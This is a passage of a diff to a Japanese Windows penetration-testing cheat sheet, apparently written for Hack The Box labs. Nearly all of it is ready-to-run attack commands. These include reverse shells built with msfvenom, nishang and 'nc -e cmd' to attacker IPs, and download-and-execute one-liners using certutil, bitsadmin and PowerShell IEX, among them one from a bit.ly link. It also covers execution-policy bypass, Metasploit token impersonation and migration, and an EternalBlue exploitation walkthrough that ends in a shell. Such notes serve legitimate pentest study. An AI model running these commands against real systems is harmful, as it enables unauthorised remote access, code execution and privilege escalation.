@@ -2450,69 +2289,217 @@ PrintSpoofer.exe -c "C:\Windows\Temp\reverse.exe(reverse shellペイロードが
 ```
 PrintSpoofer:  
 https://github.com/itm4n/PrintSpoofer.git
+
+
+## 侵入先情報の列挙
+```
+systeminfo
+echo %username%
+```
+
+## reverse_shell
+### msfvenom
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > shell.exe
+rlwrap nc -lvnp 4444
+```
+
+### nishang
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.252.239:9999/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.252.239 -Port 4444
+
+rlwrap nc -lvnp 4444
+```
+
+### netcatを転送
+```
+certutil.exe -urlcache -split -f "http://10.10.10.1/nc.exe" C:\Windows\Temp\nc.exe
+C:Windows\Temp\nc.exe -e cmd 10.10.10.1 4444
+```
+
+## ファイルのダウンロード
+```
+curl http://10.10.10.1:9000/putty.exe -o putty.exe
+certutil -urlcache -split -f "http://10.10.14.11:9000/rs.exe" rs.exe
+bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
+powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11:9000/rs.exe', 'rs.exe')
+powershell -c (Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe")
+powershell -c (wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe")
+powershell -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
+```
+
+### ダウンロード&実行
+```
+powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.16:9001/nishang.ps1')"
+```
+```
+被害者(受信側):
+# 共有ディレクトリの列挙
+net view \\10.10.14.11
+# 共有ディレクトリ内のファイルを列挙
+dir \\10.10.10.1\temp
+# ローカルにコピー
+copy \\10.10.10.1\temp\rs.exe rs.exe
+```
+
+### SMBを用いたファイル共有
+```
+攻撃側(送信側):
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp .
+```
+
+### ファイルの検索
+```
+dir /s /b <ファイル名>
+dir /s /b flag*
+```
+- /s...サブフォルダまで含めたファイルまで検索対象とする
+- /b...ファイル名だけ表示
+
+## Powershell
+### Powershellスクリプトの実行
+```
+現在のユーザーの実行ポリシーの確認:
+Get-ExecutionPolicy -Scope CurrentUser
+現在のユーザーの実行ポリシーの変更:
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+```
+
+### PowerUp.ps1
+```
+# Powershellの起動
+C:> powershell.exe -nop -exec bypass
+
+# PowerUpモジュールのインポート
+PS C:\> Import-Module PowerUp.ps1
+
+# PowerUpの実行(All-Check関数を使用)
+PS C:\> Invoke-AllChecks 
+```
+
+```
+# ワンライナー
+C:\> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+```
+```
+# ディスクに触れずにPowerUpを実行
+C:\> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
+```
+
+## Metasploit
+### Metasploit(token impersonation)
+```
+シークレットモードの読み込み:
+msf6 > load_incognito
+上記のコマンドで上手くいかない場合
+msf6 > use incognito
+
+偽装するトークン一覧を表示:
+msf6 > list_tokens -g
+トークンの偽装:
+msf6 > impersonate_token "BUILTIN\Administrators"
+トークン偽装後の権限確認:
+msf6 > getuid
+```
+
+高い特権トークンを持っていても、実際には特権ユーザーの権限を持っていない場合がある。  
+この場合、偽装トークン(なりすまし)ではなく、プライマリトークンを使用する必要がある。  
+選択するのに最も安全なプロセスはservices.exeプロセスである。
+```
+移行するプロセスを探すためにプロセス一覧の表示:
+(service.exeのプロセスを探すのが無難)
+msf6 > ps
+
+プロセスの移行:
+(service.exeのPIDなどを指定)
+msf6 > migrate <PID>
+```
+
+### Metasploit(local_exploit_suggester)
+exploitをせずに脆弱性をチェックするために使用するモジュール。  
+meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。
+
+```
+msf6 > use post/multi/recon/local_exploit_suggester
+```
+
+## Tips
 ### evlilwinrm(5985)
 WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。  
 5985ポートが空いている時に使用。
 
-#### インストール
 ```
+# インストール
 gem install evil-winrm
 ```
 
-#### 使い方
 ```
 evil-winrm -u <username> -p <password> -i <remote host ip>
 ```
 
-### MS17-010_EternalBlue(without metasploit)
-エクスプロイトに必要なものを準備
-この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。
+## Kernel Exploit
+### 手動列挙
+```
+systeminfo
+```
+```
+searchsploit Microsoft Windows [OS version];
+searchsploit Microsoft Windows [build number]
+```
+### windows-exploit-suggester(自動列挙)
+windowsでexploitを列挙するためのスクリプト
+systeminfoコマンドの出力が必要
+```
+./windows-exploit-suggester.py --update
+pip install xlrd
+```
+```
+systeminfo > systeminfo.txt
+./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
+```
+### Windows-kernel-exploits
+コンパイル済みのカーネルエクスプロイト用バイナリが用意されている。  
+Windows-kernel-exploits:  
+https://github.com/SecWiki/windows-kernel-exploits.git
 
+### MS17-010_EternalBlue(without metasploit)
+エクスプロイトに必要なものを準備。
+この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。
 ```
 wget https://www.exploit-db.com/raw/42315
 mv 42315 eternalblue.py
 wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
 ```
-
 次にimpacketもインストールしておかないと使うことができないので入っていない場合は落としておく。
-
 ```
 git clone https://github.com/SecureAuthCorp/impacket.git
 cd impacket
 pip install .
 ```
-
-もしもここでpipが入っていないと警告が出た場合は、
-
+もしもここでpipが入っていないと警告が出た場合は、pipもインストールしておく。
 ```
 sudo apt install python-pip
 ```
-をして、pipもインストール。
-
-次にリバースシェルに使うペイロードをmsfvenomを利用して作成
-
+次に、リバースシェルに使うペイロードをmsfvenomを利用して作成する。
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reverse.exe
 ```
 
-次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。
-まずUSERNAMEのところを下記の画像のように変更。
+次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。  
+まずUSERNAMEのところを下記の画像のように変更。  
 
-![](./image/2021-05-06-17-48-11.png)
+![](./image/2021-05-06-17-48-11.png)  
 
-次にsmb_pwn関数内のスクリプトを下記の画像のように変更。
+次にsmb_pwn関数内のスクリプトを下記の画像のように変更。  
 
-![](./image/2021-05-06-17-48-54.png)
+![](./image/2021-05-06-17-48-54.png)  
 
-これで準備は完了
-通信を受けるためにnetcatで待ち受けておく。
-
+これで準備は完了。
+通信を受けるためにnetcatで待ち受けておく。  
 ```
 nc -lvp 1234
 ```
-
-最後にeternalblue.pyを実行
-
+最後にeternalblue.pyを実行。
 ```
 ┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
 └──╼ $python eternalblue.py 10.10.10.40 ntsvcs
@@ -2530,11 +2517,10 @@ ServiceExec Error on: 10.10.10.40
 nca_s_proto_error
 Done
 ```
-通信を待ち受けていたnetcatの方でシェルが取得できる。
-
+通信を待ち受けていたnetcatの方でシェルが取得できる。  
 ![](./image/2021-05-06-17-49-20.png)
 
-### PrivEsc Tools(Windows)
+## PrivEsc Tools(Windows)
 Windows Sysinternals:
 https://docs.microsoft.com/en-us/sysinternals/  
 
